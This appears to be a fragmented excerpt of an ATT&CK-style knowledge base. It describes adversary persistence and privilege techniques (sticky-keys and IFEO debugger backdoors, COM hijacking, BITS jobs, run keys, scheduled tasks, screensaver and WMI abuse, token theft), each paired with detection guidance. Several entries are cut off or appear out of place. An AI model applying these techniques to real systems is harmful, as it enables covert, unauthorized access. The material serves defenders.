        <code>~/.bash_profile</code> and <code>~/.bashrc</code> are executed in a user's context when a new shell opens or when a user logs in so that their environment is set correctly. <code>~/.bash_profile</code> is executed for login shells and <code>~/.bashrc</code> is executed for interactive non-login shells. This means that when a user logs in (via username and password) to the console (either locally or remotely via something like SSH), <code>~/.bash_profile</code> is executed before the initial command prompt is returned to the user. After that, every time a new shell is opened, <code>~/.bashrc</code> is executed. This allows users more fine grained control over when they want certain commands executed.

        Mac's Terminal.app is a little different in that it runs a login shell by default each time a new terminal window is opened, thus calling <code>~/.bash_profile</code> each time instead of <code>~/.bashrc</code>.

        These files are meant to be written to by the local user to configure their own environment; however, adversaries can also insert code into these files to gain persistence each time a user logs in or opens a new shell  (Citation: amnesia malware).

        Detection: While users may customize their <code>~/.bashrc</code> and <code>~/.bash_profile</code> files , there are only certain types of commands that typically appear in these files. Monitor for abnormal commands such as execution of unknown programs, opening network sockets, or reaching out across the network when user profiles are loaded during the login process.

      name: Accessibility Features
      description: |-
        Windows contains accessibility features that may be launched with a key combination before a user has logged in (for example, when the user is on the Windows logon screen). An adversary can modify the way these programs are launched to get a command prompt or backdoor without logging in to the system.

        Two common accessibility programs are <code>C:\Windows\System32\sethc.exe</code>, launched when the shift key is pressed five times and <code>C:\Windows\System32\utilman.exe</code>, launched when the Windows + U key combination is pressed. The sethc.exe program is often referred to as "sticky keys", and has been used by adversaries for unauthenticated access through a remote desktop login screen. (Citation: FireEye Hikit Rootkit)

        Depending on the version of Windows, an adversary may take advantage of these features in different ways because of code integrity enhancements. In newer versions of Windows, the replaced binary needs to be digitally signed for x64 systems, the binary must reside in <code>%systemdir%\</code>, and it must be protected by Windows File or Resource Protection (WFP/WRP). (Citation: DEFCON2016 Sticky Keys) The debugger method was likely discovered as a potential workaround because it does not require the corresponding accessibility feature binary to be replaced. Examples for both methods:

        For simple binary replacement on Windows XP and later as well as and Windows Server 2003/R2 and later, for example, the program (e.g., <code>C:\Windows\System32\utilman.exe</code>) may be replaced with "cmd.exe" (or another program that provides backdoor access). Subsequently, pressing the appropriate key combination at the login screen while sitting at the keyboard or when connected over Remote Desktop Protocol will cause the replaced file to be executed with SYSTEM privileges. (Citation: Tilbury 2014)

        For the debugger method on Windows Vista and later as well as Windows Server 2008 and later, for example, a Registry key may be modified that configures "cmd.exe," or another program that provides backdoor access, as a "debugger" for the accessibility program (e.g., "utilman.exe"). After the Registry is modified, pressing the appropriate key combination at the login screen while at the keyboard or when connected with RDP will cause the "debugger" program to be executed with SYSTEM privileges. (Citation: Tilbury 2014)

        Other accessibility features exist that may also be leveraged in a similar fashion: (Citation: DEFCON2016 Sticky Keys)

        *On-Screen Keyboard: <code>C:\Windows\System32\osk.exe</code>
        *Magnifier: <code>C:\Windows\System32\Magnify.exe</code>
        *Narrator: <code>C:\Windows\System32\Narrator.exe</code>
        *Display Switcher: <code>C:\Windows\System32\DisplaySwitch.exe</code>
        *App Switcher: <code>C:\Windows\System32\AtBroker.exe</code>

        Detection: Changes to accessibility utility binaries or binary paths that do not correlate with known software, patch cycles, etc., are suspicious. Command line invocation of tools capable of modifying the Registry for associated keys are also suspicious. Utility arguments and the binaries themselves should be monitored for changes. Monitor Registry keys within <code>HKEY_LOCAL_MACHINE\SOFTWARE\Microsoft\Windows NT\CurrentVersion\Image File Execution Options</code>.

        Registry entries in <code>HKLM\\Software\\[Wow6432Node\\]Microsoft\\Windows

        to repeatedly execute malicious code and establish Persistence.\n\nDetection:
        Monitor for changes to Registry entries associated with Winlogon that do not
        correlate with known software, patch cycles, etc. Tools such as Sysinternals

      name: Application Shimming
      description: |-
        The Microsoft Windows Application Compatibility Infrastructure/Framework (Application Shim) was created to allow backward compatibility of programs as Windows updates and changes its code. For example, the application shimming feature allows developers to apply fixes to applications (without rewriting code) that were created for Windows XP so that it will work with Windows 10. (Citation: Engame Process Injection July 2017) Within the framework, shims are created to act as a buffer between the program (or more specifically, the Import Address Table) and the Windows OS. When a program is executed, the shim cache is referenced to determine if the program requires the use of the shim database (.sdb). If so, the shim database uses Hooking to redirect the code as necessary in order to communicate with the OS. A list of all shims currently installed by the default Windows installer (sdbinst.exe) is kept in:

        * <code>%WINDIR%\AppPatch\sysmain.sdb</code>
        * <code>hklm\software\microsoft\windows nt\currentversion\appcompatflags\installedsdb</code>

        Custom databases are stored in:

        * <code>%WINDIR%\AppPatch\custom & %WINDIR%\AppPatch\AppPatch64\Custom</code>
        * <code>hklm\software\microsoft\windows nt\currentversion\appcompatflags\custom</code>

        To keep shims secure, Windows designed them to run in user mode so they cannot modify the kernel and you must have administrator privileges to install a shim. However, certain shims can be used to Bypass User Account Control (UAC) (RedirectEXE), inject DLLs into processes (InjectDLL), disable Data Execution Prevention (DisableNX) and Structure Exception Handling (DisableSEH), and intercept memory addresses (GetProcAddress). Similar to Hooking, utilizing these shims may allow an adversary to perform several malicious acts such as elevate privileges, install backdoors, disable defenses like Windows Defender, etc.

        Detection: There are several public tools available that will detect shims that are currently available (Citation: Black Hat 2015 App Shim):

        * Shim-Process-Scanner - checks memory of every running process for any Shim flags
        * Shim-Detector-Lite - detects installation of custom shim databases
        * Shim-Guard - monitors registry for any shim installations
        * ShimScanner - forensic tool to find active shims in memory
        * ShimCacheMem - Volatility plug-in that pulls shim cache from memory (note: shims are only cached after reboot)

        Monitor process execution for sdbinst.exe and command-line arguments for potential indications of application shim abuse.

      description: |-
        Windows Background Intelligent Transfer Service (BITS) is a low-bandwidth, asynchronous file transfer mechanism exposed through Component Object Model (COM) (Citation: Microsoft COM). (Citation: Microsoft BITS) BITS is commonly used by updaters, messengers, and other applications preferred to operate in the background (using available idle bandwidth) without interrupting other networked applications. File transfer tasks are implemented as BITS jobs, which contain a queue of one or more file operations.

        The interface to create and manage BITS jobs is accessible through PowerShell  (Citation: Microsoft BITS) and the BITSAdmin tool. (Citation: Microsoft BITS)Admin

        Adversaries may abuse BITS to download, execute, and even clean up after malicious code. BITS tasks are self-contained in the BITS job database, without new files or registry modifications, and often permitted by host firewalls. (Citation: CTU BITS Malware June 2016) (Citation: Mondok Windows PiggyBack BITS May 2007) (Citation: Symantec BITS May 2007) BITS enabled execution may also allow Persistence by creating long-standing jobs (the default maximum lifetime is 90 days and extendable) or invoking an arbitrary program when a job completes or errors (including after system reboots). (Citation: PaloAlto UBoatRAT Nov 2017) (Citation: CTU BITS Malware June 2016)

        BITS upload functionalities can also be used to perform Exfiltration Over Alternative Protocol. (Citation: CTU BITS Malware June 2016)

        Detection: BITS runs as a service and its status can be checked with the Sc query utility (<code>sc query bits</code>). (Citation: Microsoft Issues with BITS July 2011) Active BITS tasks can be enumerated using the BITSAdmin tool (<code>bitsadmin /list /allusers /verbose</code>). (Citation: Microsoft BITS)

        Monitor usage of the BITSAdmin tool (especially the ‘Transfer’, 'Create', 'AddFile', 'SetNotifyFlags', 'SetNotifyCmdLine', 'SetMinRetryDelay', 'SetCustomHeaders', and 'Resume' command options)  (Citation: Microsoft BITS)Admin and the Windows Event log for BITS activity. Also consider investigating more detailed information about jobs by parsing the BITS job database. (Citation: CTU BITS Malware June 2016)

        Monitor and analyze network activity generated by BITS. BITS jobs use HTTP(S) and SMB for remote connections and are tethered to the creating user and will only function when that user is logged on (this rule applies even if a user attaches the job to a service account). (Citation: Microsoft BITS)

      name: Browser Extensions
      description: |-
        Browser extensions or plugins are small programs that can add functionality and customize aspects of internet browsers. They can be installed directly or through a browser's app store. Extensions generally have access and permissions to everything that the browser can access. (Citation: Wikipedia Browser Extension) (Citation: Chrome Extensions Definition)

        Malicious extensions can be installed into a browser through malicious app store downloads masquerading as legitimate extensions, through social engineering, or by an adversary that has already compromised a system. Security can be limited on browser app stores so may not be difficult for malicious extensions to defeat automated scanners and be uploaded. (Citation: Malicious Chrome Extension Numbers) Once the extension is installed, it can browse to websites in the background, (Citation: Chrome Extension Crypto Miner) (Citation: ICEBRG Chrome Extensions) steal all information that a user enters into a browser, to include credentials, (Citation: Banker Google Chrome Extension Steals Creds) (Citation: Catch All Chrome Extension) and be used as an installer for a RAT for persistence. There have been instances of botnets using a persistent backdoor through malicious Chrome extensions. (Citation: Stantinko Botnet) There have also been similar examples of extensions being used for command & control  (Citation: Chrome Extension C2 Malware).

        Detection: Inventory and monitor browser extension installations that deviate from normal, expected, and benign extensions. Process and network monitoring can be used to detect browsers communicating with a C2 server. However, this may prove to be a difficult way of initially detecting a malicious extension depending on the nature and volume of the traffic it generates.

        Monitor for any new items written to the Registry or PE files written to disk. That may correlate with browser extension installation.

      description: |-
        The  (Citation: Microsoft Component Object Model) (COM) is a system within Windows to enable interaction between software components through the operating system. (Citation: Microsoft Component Object Model) Adversaries can use this system to insert malicious code that can be executed in place of legitimate software through hijacking the COM references and relationships as a means for persistence. Hijacking a COM object requires a change in the Windows Registry to replace a reference to a legitimate system component which may cause that component to not work when executed. When that system component is executed through normal system operation the adversary's code will be executed instead. (Citation: GDATA COM Hijacking) An adversary is likely to hijack objects that are used frequently enough to maintain a consistent level of persistence, but are unlikely to break noticeable functionality within the system as to avoid system instability that could lead to detection.

        Detection: There are opportunities to detect COM hijacking by searching for Registry references that have been replaced and through Registry operations replacing know binary paths with unknown paths. Even though some third party applications define user COM objects, the presence of objects within <code>HKEY_CURRENT_USER\Software\Classes\CLSID\</code> may be anomalous and should be investigated since user objects will be loaded prior to machine objects in <code>HKEY_LOCAL_MACHINE\SOFTWARE\Classes\CLSID\</code>. (Citation: Endgame COM Hijacking) Registry entries for existing COM objects may change infrequently. When an entry with a known good path and binary is replaced or changed to an unusual value to point to an unknown binary in a new location, then it may indicate suspicious behavior and should be investigated. Likewise, if software DLL loads are collected and analyzed, any unusual DLL load that can be correlated with a COM object Registry modification may indicate COM hijacking has been performed.

      name: Hidden Files and Directories
      description: "To prevent normal users from accidentally changing special files
        on a system, most operating systems have the concept of a ‘hidden’ file. These
        files don’t show up when a user browses the file system with a GUI or when
        using normal commands on the command line. Users must explicitly ask to show
        the hidden files either via a series of Graphical User Interface (GUI) prompts
        or with command line switches (<code>dir /a</code> for Windows and <code>ls
        –a</code> for Linux and macOS).\n\n===Windows===\n\nUsers can mark specific
        files as hidden by using the attrib.exe binary. Simply do <code>attrib +h
        filename</code> to mark a file or folder as hidden. Similarly, the “+s” marks
        a file as a system file and the “+r” flag marks the file as read only. Like
        most windows binaries, the attrib.exe binary provides the ability to apply
        these changes recursively “/S”.\n\n===Linux/Mac===\n\nUsers can mark specific
        files as hidden simply by putting a “.” as the first character in the file
        or folder name  (Citation: Sofacy Komplex Trojan) (Citation: Antiquated Mac
        Malware). Files and folder that start with a period, ‘.’, are by default hidden
        from being viewed in the Finder application and standard command-line utilities
        like “ls”. Users must specifically change settings to have these files viewable.
        For command line usages, there is typically a flag to see all files (including
        hidden ones). To view these files in the Finder Application, the following
        command must be executed: <code>defaults write com.apple.finder AppleShowAllFiles
        YES</code>, and then relaunch the Finder Application.\n\n===Mac===\n\nFiles
        on macOS can be marked with the UF_HIDDEN flag which prevents them from being
        seen in Finder.app, but still allows them to be seen in Terminal.app (Citation:
        WireLurker).\nMany applications create these hidden files and folders to store
        information so that it doesn’t clutter up the user’s workspace. For example,
        SSH utilities create a .ssh folder that’s hidden and contains the user’s known
        hosts and keys. \n\nAdversaries can use this to their advantage to hide files
        and folders anywhere on the system for persistence and evading a typical user
        or system analysis that does not incorporate investigation of hidden files.\n\nDetection:
        Monitor the file system and shell commands for files being created with a
        leading \".\" and the Windows command-line use of attrib.exe to add the hidden
        attribute.\n\nPlatforms: Linux, macOS, Windows\n\nData Sources: File monitoring,

      name: Hooking
      description: |-
        Windows processes often leverage application programming interface (API) functions to perform tasks that require reusable system resources. Windows API functions are typically stored in dynamic-link libraries (DLLs) as exported functions. Hooking involves redirecting calls to these functions and can be implemented via:
        * '''Hooks procedures''', which intercept and execute designated code in response to events such as messages, keystrokes, and mouse inputs. (Citation: Microsoft Hook Overview) (Citation: Engame Process Injection July 2017)
        * '''Import address table (IAT) hooking''', which use modifications to a process’s IAT, where pointers to imported API functions are stored. (Citation: Engame Process Injection July 2017) (Citation: Adlice Software IAT Hooks Oct 2014) (Citation: MWRInfoSecurity Dynamic Hooking 2015)
        * '''Inline hooking''', which overwrites the first bytes in an API function to redirect code flow. (Citation: Engame Process Injection July 2017) (Citation: HighTech Bridge Inline Hooking Sept 2011) (Citation: MWRInfoSecurity Dynamic Hooking 2015)

        Similar to Process Injection, adversaries may use hooking to load and execute malicious code within the context of another process, masking the execution while also allowing access to the process's memory and possibly elevated privileges. Installing hooking mechanisms may also provide Persistence via continuous invocation when the functions are called through normal use.

        Malicious hooking mechanisms may also capture API calls that include parameters that reveal user authentication credentials for Credential Access. (Citation: Microsoft TrojanSpy:Win32/Ursnif.gen!I Sept 2017)

        Hooking is commonly utilized by Rootkits to conceal files,
        processes, Registry keys, and other objects in order to hide malware and associated behaviors. (Citation: Symantec Windows Rootkits)

        Detection: Monitor for calls to the SetWindowsHookEx and SetWinEventHook functions, which install a hook procedure. (Citation: Microsoft Hook Overview) (Citation: Volatility Detecting Hooks Sept 2012) Also consider analyzing hook chains (which hold pointers to hook procedures for each type of hook) using tools  (Citation: Volatility Detecting Hooks Sept 2012) (Citation: PreKageo Winhook Jul 2011) (Citation: Jay GetHooks Sept 2011) or by programmatically examining internal kernel structures. (Citation: Zairon Hooking Dec 2006) (Citation: EyeofRa Detecting Hooking June 2017)

        Rootkits detectors  (Citation: GMER Rootkits) can also be used to monitor for various flavors of hooking activity.

        Verify integrity of live processes by comparing code in memory to that of corresponding static binaries, specifically checking for jumps and other instructions that redirect code flow. Also consider taking snapshots of newly started processes  (Citation: Microsoft Process Snapshot) to compare the in-memory IAT to the real addresses of the referenced functions. (Citation: StackExchange Hooks Jul 2012) (Citation: Adlice Software IAT Hooks Oct 2014)

        Analyze process behavior to determine if a process is performing actions it usually does not, such as opening network connections, reading files, or other suspicious actions that could relate to post-compromise behavior.

      description: |-
        A type-1 hypervisor is a software layer that sits between the guest operating systems and system's hardware. (Citation: Wikipedia Hypervisor) It presents a virtual running environment to an operating system. An example of a common hypervisor is Xen. (Citation: Wikipedia Xen) A type-1 hypervisor operates at a level below the operating system and could be designed with Rootkit functionality to hide its existence from the guest operating system. (Citation: Myers 2007) A malicious hypervisor of this nature could be used to persist on systems through interruption.

        Detection: Type-1 hypervisors may be detected by performing timing analysis. Hypervisors emulate certain CPU instructions that would normally be executed by the hardware. If an instruction takes orders of magnitude longer to execute than normal on a system that should not contain a hypervisor, one may be present. (Citation: virtualization.info 2006)

      name: Image File Execution Options Injection
      description: |-
        Image File Execution Options (IFEO) enable a developer to attach a debugger to an application. When a process is created, any executable file present in an application’s IFEO will be prepended to the application’s name, effectively launching the new process under the debugger (e.g., “C:\dbg\ntsd.exe -g  notepad.exe”). (Citation: Microsoft Dev Blog IFEO Mar 2010)

        IFEOs can be set directly via the Registry or in Global Flags via the Gflags tool. (Citation: Microsoft GFlags Mar 2017) IFEOs are represented as Debugger Values in the Registry under <code>HKLM\Software\Microsoft\Windows NT\CurrentVersion\Image File Execution Options/<executable></code> and <code> HKLM\SOFTWARE\Wow6432Node\Microsoft\Windows NT\CurrentVersion\Image File Execution Options\<executable> </code> where <code><executable></code> is the binary on which the debugger is attached. (Citation: Microsoft Dev Blog IFEO Mar 2010)

        Similar to Process Injection, this value can be abused to obtain persistence and privilege escalation by causing a malicious executable to be loaded and run in the context of separate processes on the computer. (Citation: Engame Process Injection July 2017) Installing IFEO mechanisms may also provide Persistence via continuous invocation.

        Malware may also use IFEO for Defense Evasion by registering invalid debuggers that redirect and effectively disable various system and security applications. (Citation: FSecure Hupigon) (Citation: Symantec Ushedix June 2008)

        Detection: Monitor for common processes spawned under abnormal parents and/or with creation flags indicative of debugging such as <code>DEBUG_PROCESS</code> and <code>DEBUG_ONLY_THIS_PROCESS</code>. (Citation: Microsoft Dev Blog IFEO Mar 2010)

        Monitor the IFEOs Registry value for modifications that do not correlate with known software, patch cycles, etc. Monitor and analyze application programming interface (API) calls that are indicative of Registry edits such as RegCreateKeyEx and RegSetValueEx.

        list (plist) files found in <code>/System/Library/LaunchDaemons</code> and

        may install a new launch daemon that can be configured to execute at startup
        by using launchd or launchctl to load a plist into the appropriate directories
        (Citation: OSX Malware Detection). The daemon name may be disguised by using
        a name from a related operating system or benign software  (Citation: WireLurker).
        Launch Daemons may be created with administrator privileges, but are executed
        under root privileges, so an adversary may also use a service to escalate
        privileges from administrator to root.\n \nThe plist file permissions must
        be root:wheel, but the script or program that it points to has no such requirement.
        So, it is possible for poor configurations to allow an adversary to modify

      name: Local Job Scheduling
      description: |-
        On Linux and Apple systems, multiple methods are supported for creating pre-scheduled and periodic background jobs: cron, (Citation: Die.net Linux crontab Man Page) at, (Citation: Die.net Linux at Man Page) and launchd. (Citation: AppleDocs Scheduling Timed Jobs) Unlike Scheduled Task on Windows systems, job scheduling on Linux-based systems cannot be done remotely unless used in conjunction within an established remote session, like secure shell (SSH).

        ===cron===

        System-wide cron jobs are installed by modifying <code>/etc/crontab</code> file, <code>/etc/cron.d/</code> directory or other locations supported by the Cron daemon, while per-user cron jobs are installed using crontab with specifically formatted crontab files. (Citation: AppleDocs Scheduling Timed Jobs) This works on Mac and Linux systems.

        Those methods allow for commands or scripts to be executed at specific, periodic intervals in the background without user interaction. An adversary may use job scheduling to execute programs at system startup or on a scheduled basis for Persistence, (Citation: Janicab) (Citation: Methods of Mac Malware Persistence) (Citation: Malware Persistence on OS X) (Citation: Avast Linux Trojan Cron Persistence) to conduct Execution as part of Lateral Movement, to gain root privileges, or to run a process under the context of a specific account.

        ===at===

        The at program is another means on Linux-based systems, including Mac, to schedule a program or script job for execution at a later date and/or time, which could also be used for the same purposes.

        ===launchd===

        Each launchd job is described by a different configuration property list (plist) file similar to Launch Daemon or Launch Agent, except there is an additional key called <code>StartCalendarInterval</code> with a dictionary of time values. (Citation: AppleDocs Scheduling Timed Jobs) This only works on macOS and OS X.

        Detection: Legitimate scheduled jobs may be created during installation of new software or through administration functions. Jobs scheduled with launchd and cron can be monitored from their respective utilities to list out detailed information about the jobs. Monitor process execution resulting from launchd and cron tasks to look for unusual or unknown applications and behavior.

        ===Windows===

        Windows allows logon scripts to be run whenever a specific user or group of users log into a system. (Citation: TechNet Logon Scripts) The scripts can be used to perform administrative functions, which may often execute other programs or send information to an internal logging server.

        If adversaries can access these scripts, they may insert additional code into the logon script to execute their tools when a user logs in. This code can allow them to maintain persistence on a single system, if it is a local script, or to move laterally within a network, if the script is stored on a central server and pushed to many systems. Depending on the access configuration of the logon scripts, either local credentials or an administrator account may be necessary.

        ===Mac===

        Mac allows login and logoff hooks to be run as root whenever a specific user logs into or out of a system. A login hook tells Mac OS X to execute a certain script when a user logs in, but unlike startup items, a login hook executes as root (Citation: creating login hook). There can only be one login hook at a time though. If adversaries can access these scripts, they can insert additional code to the script to execute their tools when a user logs in.

        Detection: Monitor logon scripts for unusual access by abnormal users or at abnormal times. Look for files added or modified by unusual accounts outside of normal administration duties.

        Platforms: macOS, Windows

        Data Sources: File monitoring, Process monitoring

        System Requirements: Write access to system or domain logon scripts

        Netsh.exe (also referred to as Netshell) is a command-line scripting utility used to interact with the network configuration of a system. It contains functionality to add helper DLLs for extending functionality of the utility. (Citation: TechNet Netsh) The paths to registered netsh.exe helper DLLs are entered into the Windows Registry at <code>HKLM\SOFTWARE\Microsoft\Netsh</code>.

        Adversaries can use netsh.exe with helper DLLs to proxy execution of arbitrary code in a persistent manner when netsh.exe is executed automatically with another Persistence technique or if other persistent software is present on the system that executes netsh.exe as part of its normal functionality. Examples include some VPN software that invoke netsh.exe. (Citation: Demaske Netsh Persistence)

        Proof of concept code exists to load Cobalt Strike's payload using netsh.exe helper DLLs. (Citation: Github Netsh Helper CS Beacon)

        Detection: It is likely unusual for netsh.exe to have any child processes in most environments. Monitor process executions and investigate any child processes spawned by netsh.exe for malicious behavior. Monitor the <code>HKLM\SOFTWARE\Microsoft\Netsh</code> registry key for any new or suspicious entries that do not correlate with known system files or benign software.

Examples for both Word and Excel have been discovered and published. By default, Word has a Normal.dotm template created that can be modified to include a malicious macro. Excel does not have a template file created by default, but one can be added that will automatically be loaded. (Citation: enigma0x3 normal.dotm) (Citation: Hexacorn Office Template Macros)

        Word Normal.dotm location:<code>C:\Users\(username)\AppData\Roaming\Microsoft\Templates\Normal.dotm</code>

        Excel Personal.xlsb location:<code>C:\Users\(username)\AppData\Roaming\Microsoft\Excel\XLSTART\PERSONAL.XLSB</code>

        An adversary may need to enable macros to execute unrestricted depending on the system or enterprise security policy on use of macros.

        ===Office Test===

        A Registry location was found that when a DLL reference was placed within it the corresponding DLL pointed to by the binary path would be executed every time an Office application is started (Citation: Hexacorn Office Test)

        <code>HKEY_CURRENT_USER\Software\Microsoft\Office test\Special\Perf</code>

        ===Add-ins===

        Office add-ins can be used to add functionality to Office programs. (Citation: Microsoft Office Add-ins)

        Add-ins can also be used to obtain persistence because they can be set to execute code when an Office application starts. There are different types of add-ins that can be used by the various Office products; including Word/Excel add-in Libraries (WLL/XLL), VBA add-ins, Office Component Object Model (COM) add-ins, automation add-ins, VBA Editor (VBE), and Visual Studio Tools for Office (VSTO) add-ins. (Citation: MRWLabs Office Persistence Add-ins)

        Detection: Many Office-related persistence mechanisms require changes to the Registry and for binaries, files, or scripts to be written to disk or existing files modified to include malicious scripts. Collect events related to Registry key creation and modification for keys that could be used for Office-based persistence. Modification to base templated, like Normal.dotm, should also be investigated since the base templates should likely not contain VBA macros. Changes to the Office macro security settings should also be investigated.

        Monitor and validate the Office trusted locations on the file system and audit the Registry entries relevant for enabling add-ins. (Citation: MRWLabs Office Persistence Add-ins)

        Non-standard process execution trees may also indicate suspicious or malicious behavior. Collect process execution information including process IDs (PID) and parent process IDs (PPID) and look for abnormal chains of activity resulting from Office processes. If winword.exe is the parent process for suspicious processes and activity relating to other adversarial techniques, then it could indicate that the application was used maliciously.

This file also defines routines for processing command-line arguments and for gathering system settings, and is thus recommended to include in the start of Startup Item Scripts (Citation: Startup Items). In macOS and OS X, this is now a deprecated technique in favor of launch agents and launch daemons, but is currently still used.

      name: Registry Run Keys / Start Folder
      description: |-
        Adding an entry to the "run keys" in the Registry or startup folder will cause the program referenced to be executed when a user logs in. (Citation: Microsoft Run Key) The program will be executed under the context of the user and will have the account's associated permissions level.

        Adversaries can use these configuration locations to execute malware, such as remote access tools, to maintain persistence through system reboots. Adversaries may also use Masquerading to make the Registry entries look as if they are associated with legitimate programs.

        Detection: Monitor Registry for changes to run keys that do not correlate with known software, patch cycles, etc. Monitor the start folder for additions or changes. Tools such as Sysinternals Autoruns may also be used to detect system changes that could be attempts at persistence, including listing the run keys' Registry locations and startup folders. (Citation: TechNet Autoruns) Suspicious program execution as startup programs may show up as outlier processes that have not been seen before when compared against historical data.

        Changes to these locations typically happen under normal conditions when legitimate software is installed. To increase confidence of malicious activity, data and events should not be viewed in isolation, but as part of a chain of behavior that could lead to other activities, such as network connections made for Command and Control, learning details about the environment through Discovery, and Lateral Movement.

      name: Scheduled Task
      description: |-
        Utilities such as at and schtasks, along with the Windows Task Scheduler, can be used to schedule programs or scripts to be executed at a date and time. A task can also be scheduled on a remote system, provided the proper authentication is met to use RPC and file and printer sharing is turned on. Scheduling a task on a remote system typically required being a member of the Administrators group on the the remote system. (Citation: TechNet Task Scheduler Security)

        An adversary may use task scheduling to execute programs at system startup or on a scheduled basis for persistence, to conduct remote Execution as part of Lateral Movement, to gain SYSTEM privileges, or to run a process under the context of a specified account.

        Detection: Monitor scheduled task creation from common utilities using command-line invocation. Legitimate scheduled tasks may be created during installation of new software or through system administration functions. Monitor process execution from the <code>svchost.exe</code> in Windows 10 and the Windows Task Scheduler <code>taskeng.exe</code> for older versions of Windows. (Citation: Twitter Leoloobeek Scheduled Task) If scheduled tasks are not used for persistence, then the adversary is likely to remove the task when the action is complete. Monitor Windows Task Scheduler stores in <code>%systemroot%\System32\Tasks</code> for change entries related to scheduled tasks that do not correlate with known software, patch cycles, etc. Data and events should not be viewed in isolation, but as part of a chain of behavior that could lead to other activities, such as network connections made for Command and Control, learning details about the environment through Discovery, and Lateral Movement.

        Configure event logging for scheduled task creation and changes by enabling the "Microsoft-Windows-TaskScheduler/Operational" setting within the event logging service. (Citation: TechNet Forum Scheduled Task Operational Setting) Several events will then be logged on scheduled task activity, including: (Citation: TechNet Scheduled Task Events)

        *Event ID 106 - Scheduled task registered
        *Event ID 140 - Scheduled task updated
        *Event ID 141 - Scheduled task removed

        Tools such as Sysinternals Autoruns may also be used to detect system changes that could be attempts at persistence, including listing current scheduled tasks. (Citation: TechNet Autoruns) Look for changes to tasks that do not correlate with known software, patch cycles, etc. Suspicious program execution through scheduled tasks may show up as outlier processes that have not been seen before when compared against historical data.

        Monitor processes and command-line arguments for actions that could be taken to create tasks. Remote access tools with built-in features may interact directly with the Windows API to perform these functions outside of typical system utilities. Tasks may also be created through Windows system management tools such as Windows Management Instrumentation and PowerShell, so additional logging may need to be configured to gather the appropriate data.

      name: Screensaver
      description: |-
        Screensavers are programs that execute after a configurable time of user inactivity and consist of Portable Executable (PE) files with a .scr file extension. (Citation: Wikipedia Screensaver) The Windows screensaver application scrnsave.exe is located in <code>C:\Windows\System32\</code> along with screensavers included with base Windows installations. The following screensaver settings are stored in the Registry (<code>HKCU\Control Panel\Desktop\</code>) and could be manipulated to achieve persistence:

        *<code>SCRNSAVE.exe</code> - set to malicious PE path
        *<code>ScreenSaveActive</code> - set to '1' to enable the screensaver
        *<code>ScreenSaverIsSecure</code> - set to '0' to not require a password to unlock
        *<code>ScreenSaverTimeout</code> - sets user inactivity timeout before screensaver is executed

        Adversaries can use screensaver settings to maintain persistence by setting the screensaver to run malware after a certain timeframe of user inactivity. (Citation: ESET Gazer Aug 2017)

        Detection: Monitor process execution and command-line parameters of .scr files. Monitor changes to screensaver configuration changes in the Registry that may not correlate with typical user behavior.

        Tools such as Sysinternals Autoruns can be used to detect changes to the screensaver binary path in the Registry. Suspicious paths and PE files may indicate outliers among legitimate screensavers in a network and should be investigated.

      name: Trap
      description: |-
        The <code>trap</code> command allows programs and shells to specify commands that will be executed upon receiving interrupt signals. A common situation is a script allowing for graceful termination and handling of common  keyboard interrupts like <code>ctrl+c</code> and <code>ctrl+d</code>. Adversaries can use this to register code to be executed when the shell encounters specific interrupts either to gain execution or as a persistence mechanism. Trap commands are of the following format <code>trap 'command list' signals</code> where "command list" will be executed when "signals" are received.

        Detection: Trap commands must be registered for the shell or programs, so they appear in files. Monitoring files for suspicious or overly broad trap commands can narrow down suspicious behavior during an investigation. Monitor for suspicious processes executed through trap interrupts.

      name: Windows Management Instrumentation Event Subscription
      description: |-
        Windows Management Instrumentation (WMI) can be used to install event filters, providers, consumers, and bindings that execute code when a defined event occurs. Adversaries may use the capabilities of WMI to subscribe to an event and execute arbitrary code when that event occurs, providing persistence on a system. Adversaries may attempt to evade detection of this technique by compiling WMI scripts. (Citation: Dell WMI Persistence) Examples of events that may be subscribed to are the wall clock time or the computer's uptime. (Citation: Kazanciyan 2014) Several threat groups have reportedly used this technique to maintain persistence. (Citation: Mandiant M-Trends 2015)

        Detection: Monitor WMI event subscription entries, comparing current WMI event subscriptions to known good subscriptions for each host. Tools such as Sysinternals Autoruns may also be used to detect WMI changes that could be attempts at persistence. (Citation: TechNet Autoruns)

      name: Access Token Manipulation
      description: "Windows uses access tokens to determine the ownership of a running
        process.  A user can manipulate access tokens to make a running process appear
        as though it belongs to someone other than the user that started the process.
        \ When this occurs, the process also takes on the security context associated
        with the new token.  For example, Microsoft promotes the use of access tokens
        as a security best practice.  Administrators should log in as a standard user
        but run their tools with administrator privileges using the built-in access
        token manipulation command <code>runas</code>.  (Citation: Microsoft runas)\n
        \ \nAdversaries may use access tokens to operate under a different user or
        system security context to perform actions and evade detection. An adversary
        can use built-in Windows API functions to copy access tokens from existing
        processes; this is known as token stealing.  An adversary must already be
        in a privileged user context (i.e. administrator) to steal a token.  However,
        adversaries commonly use token stealing to elevate their security context
        from the administrator level to the SYSTEM level. An adversary can use a token
        to authenticate to a remote system as the account for that token if the account
        has appropriate permissions on the remote system. (Citation: Pentestlab Token
        Manipulation)\n\nAccess tokens can be leveraged by adversaries through three
        methods: (Citation: BlackHat Atkinson Winchester Token Manipulation)\n\n'''Token
        Impersonation/Theft''' - An adversary creates a new access token that duplicates
        an existing token using <code>DuplicateToken(Ex)</code>. The token can then
        be used with <code>ImpersonateLoggedOnUser</code> to allow the calling thread
        to impersonate a logged on user's security context, or with <code>SetThreadToken</code>
        to assign the impersonated token to a thread. This is useful for when the
        target user has a non-network logon session on the system.\n\n'''Create Process
        with a Token''' - An adversary creates a new access token with <code>DuplicateToken(Ex)</code>
        and uses it with <code>CreateProcessWithTokenW</code> to create a new process
        running under the security context of the impersonated user. This is useful
        for creating a new process under the security context of a different user.\n\n'''Make
        and Impersonate Token''' - An adversary has a username and password but the
        user is not logged onto the system. The adversary can then create a logon
        session for the user using the <code>LogonUser</code> function. The function
        will return a copy of the new session's access token and the adversary can
        use <code>SetThreadToken</code> to assign the token to a thread.\n\nAny standard
        user can use the <code>runas</code> command, and the Windows API functions,
        to create impersonation tokens; it does not require access to an administrator
        account.\n\nMetasploit’s Meterpreter payload allows arbitrary token manipulation
        and uses token impersonation to escalate privileges.  (Citation: Metasploit
        access token)  The Cobalt Strike beacon payload allows arbitrary token impersonation
        and can also create tokens.  (Citation: Cobalt Strike Access Token)\n\nDetection:
        If an adversary is using a standard command-line shell, analysts can detect
        token manipulation by auditing command-line activity.  Specifically, analysts
        should look for use of the <code>runas</code> command. Detailed command-line
        logging is not enabled by default in Windows. (Citation: Microsoft Command-line
